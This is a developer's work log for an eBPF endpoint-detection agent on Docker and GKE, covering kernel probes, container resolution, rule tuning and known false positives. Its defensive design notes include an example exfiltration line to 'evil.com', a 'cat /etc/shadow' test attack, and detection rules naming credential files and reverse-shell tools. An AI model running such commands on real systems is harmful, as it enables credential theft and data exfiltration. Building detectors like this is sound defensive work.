# Work Log / Notes

---

## Completed

- [x] `execsnoop.bpf.c` + `main.go` — process monitor capturing execve events
- [x] `exitsnoop.bpf.c` — exit monitor built, then removed (see note below)
- [x] Integration tests pass while monitor runs — no false positives (snapshot: PrintProcess&Exit.png)
- [x] Fix `alert.go` format string bug — `comm=%!s(int32=...)` → correct output
- [x] `rules.go` — detection rules: shell spawn, network tools, short-lived exit
- [x] `alert.go` — Alert struct with Ppid, Uid, Container fields
- [x] `mnt_ns` container correlation — `execsnoop.bpf.c` reads `mnt_ns_id` via CO-RE, `container.go` resolves to container name
- [x] Fix `ExitEvent` struct alignment bug — Go struct field order did not match C struct
- [x] `opensnoop.bpf.c` — file access monitor with ring buffer, two-probe pattern (enter+exit)
- [x] File access detection rules — tiered severity: CRITICAL/HIGH/MEDIUM
- [x] Fix garbled comm/filename output — replaced `bytes.TrimRight` with `cstring()` (IndexByte)
- [x] Remove curl from process rules — decision: curl detection belongs in lsm-connect (destination-aware)
- [x] BPF fix: emit on EACCES/EPERM in addition to success — restores `cat /etc/shadow` detection
- [x] pid→container cache — fixes `container=unknown` and wrong ppid in exit events
- [x] Hybrid namespace strategy — `unknown-ns` CRITICAL alert for container escape, host Docker overlay CRITICAL rule
- [x] resolveContainer: immediate /proc rescan on cache miss before declaring unknown-ns
- [x] `lsm-connect.bpf.c` — network monitor with ring buffer, loopback filtered in BPF, audit-only
- [x] Network rules — RFC 1918 private IP filter, `externalAllowedContainers` allowlist, `checkNetworkRules`
- [x] Named constants — `nsRefreshInterval`, `externalAllowedContainers` (no more magic numbers)
- [x] `VALIDATION.md` + `validate.sh` — 7-test validation suite with concurrent integration traffic
- [x] Validation confirmed: all 7 detection rules fire correctly against real containers
- [x] Refactor Go structure — `cmd/`, `pkg/`, `internal/`, `kernel/` package layout
- [x] CI pipeline — GitHub Actions vet + test + build; `Makefile` with generate/build/test targets ✅
- [x] Phase 1 — pipeline refactor + WorkloadIdentity
  - `pkg/workload/`: `WorkloadIdentity` struct, `WorkloadResolver` interface, `DockerResolver`
  - `pkg/pipeline/`: `RawEvent`, `EnrichedEvent`, `EventType`, core interfaces
  - `internal/alert/`: `Alert.Workload WorkloadIdentity` (replaces `Container string`); added `Filename`, `DstIP`, `DstPort` fields
  - `pkg/detector/`: `RuleDetector` struct implementing `Detector` interface; rules use `id.Service` (not raw container string)
  - `pkg/detector/policy.go`: `externalAllowedServices = ["inventory-service"]` (normalized, works for Docker + K8s)
  - `cmd/edr-monitor/main.go`: buffered pipeline `rawCh(4096) → enrichedCh(1024) → alertCh(64)`; `--runtime` flag; metrics every 10s
  - `Makefile`: `GOOS=linux GOARCH=amd64` for cross-compile from macOS; updated `vet` targets
  - Deleted `pkg/container/container.go` — replaced by `pkg/workload/docker_resolver.go`
  - **Validated on Docker VM** ✓ — `service=inventory-service`, `service=auth-service`, LOW/CRITICAL alerts correct
- [x] Phase 2 — K8sResolver + pending-ns buffer
  - `pkg/workload/k8s_resolver.go` — `K8sResolver`: K8s cgroup path parser (all 3 QoS classes), crictl subprocess for container metadata, self-filter (agent's own `mnt_ns_id` → "host"), 5s refresh interval
  - `pkg/workload/resolver.go` — `NewResolver("k8s")` now returns `K8sResolver`
  - `cmd/edr-monitor/main.go` — pause filter (`comm == "pause"` dropped in enricher); pending-ns retry loop (3s interval, max 3 retries / 10s → escalates to CRITICAL); `unknown_ns` + `pending_ns` in metrics
  - Unit tests (cgroup parser, self-filter, pending retry) — noted, add before Phase 4
- [x] WorkloadIdentity refactor — `ResolveResult` / `ResolveState` typed enum
  - `pkg/workload/identity.go` — `ResolveState` enum (`StateResolved|StateHost|StatePending|StateUnknown`), `WorkloadIdentity` (rules: Runtime+Service), `WorkloadMeta` (debug: Container/Pod/Namespace/Node/Region), `ResolveResult`; `WorkloadResolver` interface moved here (no build tag)
  - Detection rules use `res.State ==` instead of magic strings; K8s `normalizeServiceName` bug fixed (containerName used directly)
  - `cmd/edr-monitor/main.go` — 3 producer goroutines (BPF readers), `log.Fatalf` on fatal errors
- [x] Phase 3 — Dockerfile + Makefile docker targets + push to AR
  - Binary cross-compiled on macOS via `make build`; single-stage Dockerfile packages binary + installs crictl
  - `make docker-build` / `make docker-push` working; image: `us-west1-docker.pkg.dev/ebpfagent/ebpf-edr/ebpf-edr:latest`
  - `gcp_gke`: `ebpf-edr` AR repo in Pulumi, `imageEbpfEdr` constant in config
- [x] Phase 4 — GKE DaemonSet deployed and running on both clusters
  - `k8s/ebpf-edr-ds.yaml` — privileged DaemonSet in `kube-system`; `hostPID: true`, `hostNetwork: true`; `${REGION}` substituted via `envsubst`
  - Required mounts: `/proc`, `/sys/kernel/btf`, `/run/containerd/containerd.sock`, `/sys/kernel/debug`, `/sys/kernel/tracing` (debugfs+tracefs needed for tracepoints)
  - `deploy.sh all` — calls `_push_ebpf_image` (runs `make docker-push` if `ebpf-edr-demo/` found locally) then `for_each_cluster deploy_full`
  - `deploy.sh daemonset` — downloads YAML from GitHub raw URL, substitutes region, applies to all clusters
  - **Bug fixed**: `containerIDFromK8sCgroup` — GKE Ubuntu nodes use cgroup v2 systemd format (`cri-containerd-<id>.scope`); old code matched `/kubepods/` (cgroup v1 only); fixed to match `kubepods` and strip prefix/suffix
  - **Validated**: workload resolver populates `service=`, `pod=`, `namespace=` correctly (e.g. `service=operator pod=gmp-operator-599978c87f-x57lt namespace=gmp-system`)

---

## Key Technical Notes

### TASK_COMM_LEN: 16 → 128
Changed `#define TASK_COMM_LEN 16` to `128` in all `.h` files to capture full executable paths.
Must match Go struct field size exactly — `Comm [128]byte`.

---

### mnt_ns_id — use __u32 not __u64
Kernel's `ns.inum` is `unsigned int` (32-bit). Use `__u32 mnt_ns_id` in C struct and `uint32` in Go.
`BPF_CORE_READ(task, nsproxy, mnt_ns, ns.inum)` — requires kernel 5.8+ BTF (6.1 confirmed working).

---

### K8s cgroup path parsing — cgroup v1 vs cgroup v2 systemd

K8s sets pod cgroup paths based on QoS class and cgroup version:

**cgroup v1** (older nodes):
```
Guaranteed:  12:blkio:/kubepods/pod<uid>/<container-id>
Burstable:   12:blkio:/kubepods/burstable/pod<uid>/<container-id>
BestEffort:  12:blkio:/kubepods/besteffort/pod<uid>/<container-id>
```

**cgroup v2 systemd** (GKE Ubuntu nodes — confirmed GKE 6.8 kernel):
```
0::/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod<uid>.slice/cri-containerd-<id>.scope
```

Container ID extraction:
1. Match any line containing `kubepods` (covers both formats)
2. Take everything after the last `:`
3. Split by `/`, take last segment
4. If segment matches `cri-containerd-<id>.scope` — strip prefix and suffix to get bare `<id>`

**Bug**: original code matched `/kubepods/` (v1 only) — missed all GKE Ubuntu nodes which use v2. Fix: match `kubepods` and handle the `.scope` suffix.

---

### K8s pending-ns vs Docker unknown-ns

Key behavioral difference between the two resolvers:

| | Docker | K8s |
|---|---|---|
| Cache miss return | `"unknown-ns"` → CRITICAL immediately | `"pending-ns"` → buffer + retry |
| Why | Docker containers are long-lived; unknown ns = escape signal | K8s pods start fast (HPA); unknown ns = likely new pod not yet in cache |
| Grace period | None | 3 retries × 3s = up to ~9s; hard cap at 10s from first seen |

After grace period: K8s also escalates to CRITICAL `unknown_namespace_process` — just with a delay to absorb the pod startup window.

Buffer is unbounded per namespace ID but capped by retry count/age per entry. Under extreme churn (many unique new mnt_ns_ids), memory could grow — acceptable for MVP, monitor `pending_ns` counter.

---

### K8s self-filter — agent's own namespace

At `K8sResolver.Start()`, read `/proc/self/ns/mnt` to get the DaemonSet pod's own mount namespace ID. Map it to `Service: "host"` in the cache. The detector skips all events where `id.Service == "host"`, so the agent never alerts on its own activity (e.g., running crictl, reading /proc).

---

### DaemonSet required mounts — debugfs and tracefs

eBPF tracepoints attach via tracefs (mounted at `/sys/kernel/tracing`) or debugfs (`/sys/kernel/debug/tracing`). These are host filesystems not visible inside the container by default.

Without them, the agent fails at startup with:
```
attaching process tracepoint: neither debugfs nor tracefs are mounted
```

Required volume mounts in `ebpf-edr-ds.yaml`:
```yaml
- name: debugfs
  mountPath: /sys/kernel/debug
- name: tracefs
  mountPath: /sys/kernel/tracing
```
Both are mounted without `readOnly: true` (kernel requires write access to attach/detach tracepoints).
`privileged: true` is also required (already set) — without it the container cannot access these even if mounted.

---

### Known GKE false positives

These alerts fire on every GKE cluster and are **not threats**:

| `comm` | Rule | Reason |
|---|---|---|
| `iptables` / `ip6tables` | `unknown_namespace_process` CRITICAL | kube-proxy runs iptables in host net namespace every ~30s to sync routing rules |
| `redis-cli` | `unknown_namespace_process` CRITICAL | kubelet liveness probe for redis pod — runs `redis-cli ping` from host |
| `operator` → port 10250 | `unauthorized_external_connect` HIGH | GKE Managed Prometheus (`gmp-system/gmp-operator`) polls kubelet metrics API |
| `sidecar`, `prometheus` reading `/proc/1/stat` | `sensitive_file_access` HIGH | GKE monitoring sidecars read host proc files for CPU/memory metrics |
| `event-exporter` reading `/proc/1/stat` | `sensitive_file_access` HIGH | GKE event exporter reads host proc for node metadata |

In production these would be suppressed via an allowlist (process + namespace + destination tuples). For this demo they are expected noise.

---

### crictl — MVP approach, known limitations

MVP uses `crictl ps --output json` as a subprocess. Drawbacks vs containerd client API:
- Spawns a subprocess on every 5s refresh (overhead)
- `crictl` must be on PATH inside the DaemonSet container image
- Not real-time — new pods appear within 5s, not instantly

K8s labels set by kubelet on every container (used for resolution):
- `io.kubernetes.container.name` → `Service` and `Container` fields
- `io.kubernetes.pod.name` → `Pod` field
- `io.kubernetes.pod.namespace` → `Namespace` field

Future: replace with containerd client API (`github.com/containerd/containerd`) for real-time events and no subprocess. `WorkloadResolver` interface is unchanged — only the implementation swaps.

---

### Container name resolution → WorkloadIdentity
Docker sets `HOSTNAME` env var to container ID (short hash), NOT container name.
Reliable approach: `docker ps --no-trunc` → build full container ID → name map.
Then `/proc/<pid>/cgroup` → extract container ID → look up name.

Debian 12 / kernel 6.1 uses **cgroupv2** — path format is:
`0::/system.slice/docker-<64char-id>.scope` (not `/docker/<id>`)
`containerIDFromCgroup` handles both cgroupv1 and cgroupv2 formats.

**Service name normalization** (Phase 1): `DockerResolver.normalizeServiceName()` strips the Docker Compose
project prefix and converts underscores to hyphens:
`order-processor-inventory_service` → `inventory-service`
Algorithm: take the segment after the last `-`, then replace `_` with `-`.
Works for all services in this project (service names use underscores, project prefix uses hyphens).

**`Resolve()` is non-blocking** (Phase 1 change): previously did a blocking `/proc` rescan on cache miss.
Now: cache miss → trigger async refresh + return `Service:"unknown-ns"` immediately.
Docker containers are long-lived so cache misses are rare after startup. This constraint is required
for the K8s resolver (Phase 2) where the pipeline cannot block on crictl.

**Validated** — alert shows `service=auth-service pod=order-processor-auth_service runtime=docker`.

---

### ExitEvent struct alignment bug (fixed)
Original C struct had implicit 4-byte padding before `duration_ns`:
```
int pid (4) + int ppid (4) + unsigned exit_code (4) + [4 implicit pad] + unsigned long long duration_ns (8) + comm (128) = 152 bytes
```
Go struct had wrong field order (DurationNs first) → all fields read as garbage.

Fix: reordered `exitsnoop.h` — `duration_ns` first, explicit `unsigned int pad`:
```
duration_ns (8) + pid (4) + ppid (4) + exit_code (4) + pad (4) + comm (128) = 152 bytes, no implicit padding
```
Go `ExitEvent` updated to match exactly.

**Rule**: always put the largest field first to avoid implicit padding. Explicit pad fields replace tail padding so C sizeof == Go binary.Size.

---

### Why `unsigned long long` for duration_ns
`bpf_ktime_get_ns()` returns u64 (nanoseconds). An `unsigned int` (u32) overflows at ~4.29 seconds.
We saw python3 at 12,595ms in real output — that is 3× over the u32 limit. Must stay u64.

---

### Perf Buffer vs Ring Buffer
`execsnoop.bpf.c` uses `BPF_MAP_TYPE_PERF_EVENT_ARRAY` (perf buffer, older pattern).
All new programs (`exitsnoop`, `opensnoop`, `lsm-connect`) use `BPF_MAP_TYPE_RINGBUF` (modern — lower overhead, no per-CPU waste).

---

### Garbled comm/filename — cstring() fix
**Problem**: `bytes.TrimRight(b, "\x00")` scans from the RIGHT and stops at the first non-null byte.
`bpf_ringbuf_reserve` does NOT zero-initialize memory. `bpf_probe_read_user_str` writes up to the null terminator but leaves the rest of the buffer as garbage from previous ring buffer usage.
Result: comm and filename printed with garbage after the real string.

**Fix**: `cstring(b []byte)` uses `bytes.IndexByte(b, 0)` — finds the FIRST null byte and slices there. This is correct C-string semantics.

`bpf_get_current_comm` uses `strncpy` which DOES zero-pad, so comm was technically safe with TrimRight. But `bpf_probe_read_user_str` does NOT zero-pad. Both now use `cstring` for consistency.

---

### opensnoop: two-probe pattern (sys_enter + sys_exit)

**Why two probes?**
A single `sys_enter_openat` hook fires on every attempt — including when curl probes `~/.curlrc` which does not exist. This fires HIGH alerts for harmless config-file probing.

**Pattern**:
1. `sys_enter_openat` — read filename + process context, store in `pending_opens` hash map keyed by tid
2. `sys_exit_openat` — check return value, emit to ring buffer only if file was actually accessed, delete from map

**Return code logic** (critical — easy to get wrong):
- `ret >= 0` — valid fd, file opened successfully → emit
- `ret == -EACCES` — file EXISTS, OS blocked access (uid mismatch) → **emit** (attack attempt)
- `ret == -EPERM` — operation not permitted on existing file → **emit**
- `ret == -ENOENT` — file does not exist, just probing → **drop**
- other negative — benign errors → drop

**Mistake we made**: initially dropped ALL negative returns (`if ret < 0 → drop`).
This broke `cat /etc/shadow` detection: uid=1000 gets `-EACCES`, which was silently dropped.
Fix: `if ret < 0 && ret != -EACCES && ret != -EPERM → drop`

**Rule**: the access ATTEMPT against an existing sensitive file is the signal, whether the OS allowed it or not.

---

### File rule design — tiered severity

Learned through real output: not all sensitive files carry the same risk.

| Tier | Files | Severity | Reason |
|---|---|---|---|
| CRITICAL | `/root/.ssh/`, `/home/.ssh/` | CRITICAL | SSH keys → direct access |
| HIGH | `/etc/shadow`, `/run/secrets/`, `/proc/1/`, `.key`, `id_rsa`, `id_ed25519`, `.env` | HIGH | Credential theft, container escape |
| MEDIUM | `/etc/passwd`, `/etc/group` | MEDIUM | World-readable, but unexpected from app code |

**`.pem` removed** — too broad. Python `certifi` library loads `cacert.pem` (CA bundle) on every HTTPS request. Keeping `.pem` fires HIGH on every API call. Private keys are caught by `.key` and `id_*` names.
**TODO**: restore `.pem` with a path exception for `/site-packages/` and `/certifi/` before shipping.

---

### curl detection — why removed from process rules

**Original rule**: `curl_from_container` — alert when curl runs inside any non-whitelisted container.

**Problem**: fires on every Docker `HEALTHCHECK` (every Dockerfile has `curl -f http://localhost:PORT/health`), every integration test smoke test, and documentation examples. Fires on ALL containers, every 10–30 seconds.

**Root cause**: execsnoop sees the binary name, not the destination. Cannot distinguish:
- `curl http://localhost:8080/health` — health check, expected
- `curl https://evil.com/exfil` — attack

**Decision**: remove from process rules entirely. The correct detection is in `lsm-connect`, which hooks the network connection and can check destination IP/domain. `allowedMarketAPI = "api.coingecko.com"` constant is reserved for that enforcement.

**Lesson**: a rule that fires on every health check is worse than no rule — it trains operators to ignore alerts. Better to have a gap and fill it at the right layer.

---

### pid→container cache — fixes exit event unknowns

**Problem 1 — container=unknown**: Go tries to read `/proc/<pid>/ns/mnt` when an exit event arrives, but the process is already gone from `/proc`. Returns `unknown`.

**Problem 2 — wrong ppid**: `real_parent` in the kernel at exit time may have changed to init (PID 1) due to Linux reparenting — when a parent dies before its child, the child is reparented to init. So ppid in exit events was sometimes 0 or 1.

**Fix**: cache `pid → PidInfo{Container, Ppid}` when execsnoop fires (process starts). When exitsnoop fires, look up and evict from cache. Use cached values instead of re-reading `/proc`.

**Implementation**: `sync.Map` in `container.go` — safe for concurrent goroutine access. `LoadAndDelete` atomically retrieves and removes the entry.

**Limitation**: processes that started before the EDR agent launched have no cache entry — these still show `unknown`. This is expected and acceptable.

---

### Hybrid namespace strategy — host vs container vs escape

**Problem**: original design silently skipped ALL host processes in process rules.
If malware installs on the VM as uid=0, it appears as `container=host` and is never alerted.

**Decision**: Option A (skip all host) is too risky. Option B (full host whitelist) is a rabbit hole.
Implemented a "hybrid" strategy using mount namespace ID as the boundary:

| Namespace | Label | Action |
|---|---|---|
| mnt_ns == PID 1 namespace | `host` | skip most rules |
| mnt_ns in Docker map | `order-processor-xxx` | full container rules |
| mnt_ns not found anywhere | `unknown-ns` | CRITICAL escape alert |

**`unknown-ns` detection**:
After a cache miss, `resolveContainer` immediately rescans `/proc` to handle new containers
that started within the 30s refresh window. If STILL not found → return `"unknown-ns"`.
A process in an unrecognized namespace after a fresh rescan has no legitimate explanation —
it's either a container escape or an unauthorized namespace creation.

**Host-specific file rule**:
Instead of whitelisting all host processes, one targeted rule:
`host process + /var/lib/docker/overlay2/ → CRITICAL host_reads_container_fs`
This catches an attacker on the host reading container filesystems directly (bypasses container
isolation). No host whitelist needed — dockerd itself doesn't read overlay2 files at runtime.

**errno defines in BPF**:
`errno.h` is not available in BPF programs. Must define constants manually:
```c
#define EPERM   1
#define ENOENT  2
#define EACCES  13
```
These are stable Linux ABI values (`uapi/asm-generic/errno-base.h`). Never use raw numbers
in conditions — always define named constants for readability and maintainability.

---

### lsm-connect — LSM hook, network byte order, loopback filter

**Hook**: `lsm/socket_connect` — fires before every `connect()` syscall at kernel level.
Advantage over tracepoints: runs in the same security context as the connecting process — no TOCTOU gap.
Attached with `link.AttachLSM` (not `link.Tracepoint`).

**Audit-only**: always returns `0`. Scope originally said "block" — kept audit mode intentionally.
Blocking in a demo environment risks killing legitimate services. For this project, detection is sufficient.

**Network byte order**:
`sin_addr.s_addr` and `sin_port` are stored big-endian (network byte order) by the kernel.
Go reads them as little-endian uint32/uint16. Conversion in Go userspace:
```go
func netIP(n uint32) net.IP {
    return net.IPv4(byte(n), byte(n>>8), byte(n>>16), byte(n>>24))
}
func netPort(n uint16) uint16 { return (n>>8) | (n<<8) }
```
This works because the bytes are reversed when a big-endian value is read as little-endian.

**Loopback filter in BPF**:
```c
if ((dst_ip & 0xFF) == 0x7F) return 0;  // skip 127.x.x.x
```
Health checks and inter-process IPC flood the ring buffer. Filter loopback in BPF (cheap), defer
all other private range checks (10.x, 172.16.x, 192.168.x) to Go where policy can change without
recompiling BPF.

**externalAllowedContainers**:
Named constant list in `rules.go` — no hardcoded container names in logic.
Only `inventory_service` is permitted to connect to external IPs (CoinGecko market data).
Any other container connecting externally → HIGH `unauthorized_external_connect`.

---

### Named constants — no magic numbers

Values extracted to named constants so intent is clear and changes are localized:
- `dockerRefreshInterval = 30 * time.Second` — how often to rebuild the namespace cache (`pkg/workload/docker_resolver.go`)
- `externalAllowedServices` — services permitted to make external connections (`pkg/detector/policy.go`)
  - Phase 1: renamed from `externalAllowedContainers`, now uses normalized service names (`"inventory-service"` not `"order-processor-inventory_service"`)
  - Same policy now covers both Docker and K8s since `WorkloadIdentity.Service` is normalized consistently

---

### Validation suite — concurrent attack + integration traffic

`VALIDATION.md` documents 7 threat scenarios. `validate.sh` executes them automatically.

Key design: integration tests run in background while attack tests fire.
This validates both detection (attacks caught) and precision (no false positives from normal traffic).

**Confirmed from real output** (`alerts/alert.log`):
- inventory_service connects to CoinGecko during normal operation → LOW audit log only (not HIGH)
- All 7 attack scenarios produce the expected alert at the expected severity
- No CRITICAL or HIGH from normal API traffic

**Confirmed from real output** (`alerts/alert.log`): all 7 attack scenarios produce expected alerts, no CRITICAL or HIGH from normal service traffic.

---

### Exit monitor removed — short_lived_failure dropped

`exitsnoop.bpf.c` was built and worked. The `short_lived_failure` rule (non-zero exit + duration < 100ms)
generated persistent whitelist churn: every test tool that failed quickly triggered it (`which`, `mkdir`,
`apt-get`, `bash`, `cat`). The rule design was too broad for a workload of long-lived Python services —
any utility that fails exits quickly, which describes normal behavior not attacks.

All three real threats are covered by the other monitors:
- RCE → `shell_spawn_container` CRITICAL (execsnoop)
- Credential theft → `sensitive_file_access` (opensnoop)
- Exfiltration → `unauthorized_external_connect` (lsm-connect)

**Decision**: dropped `short_lived_failure` and the entire exit monitor infrastructure (`exitsnoop`,
`checkExitRules`, `exitWhitelist`, `shortLivedThresholdMs`, pid→container cache).

The BPF files (`exit.bpf.c`, `exit.h`) remain in the repo as reference but nothing loads them.

---

### Ingress detection (lsm/socket_accept) — decided against

Discussed: adding `SEC("lsm/socket_accept")` to detect inbound connections — port scanners,
unexpected listeners, reverse shell callbacks.

**Decision: out of scope for this project.**

Reasons:
1. **Noise**: every inter-service API call (gateway → auth, gateway → inventory, etc.) triggers
   socket_accept. Without a container-level allowlist of expected inbound sources, every
   legitimate request fires an event. The order-processor has ~8 services making constant calls.
2. **Already covered**: the reverse shell scenario (attacker plants a listener, connects back)
   is already caught by `shell_spawn_container` CRITICAL (bash spawned) and
   `network_tool_container` HIGH (nc/ncat executed). Ingress would add a third alert for the
   same attack.
3. **Where it adds value**: detecting unexpected listening containers, or external scanners
   hitting internal services. Both require knowing which containers *should* accept connections —
   another policy list to maintain. Better fit for a dedicated network security tool.

If revisited: reuse `net_event` struct, add a `direction` flag (0=outbound, 1=inbound).

---

## Rule Philosophy (learned from trial and error)

1. **Never remove a rule just to suppress symptoms** — ask whether the rule fits the threat model first. If it doesn't (e.g., short_lived_failure on long-lived service containers), remove the rule, not the noise.
2. **BPF = wide net** — collect all relevant events with minimal kernel-side filtering.
3. **Go = smart rules** — all detection logic in userspace where context is available.
4. **False positives → make rules smarter, not smaller** — add comm/path context, not delete.
5. **Detection at the right layer** — process-level rules catch binary names; network-level (lsm-connect) catches destinations. Don't mix them.

---

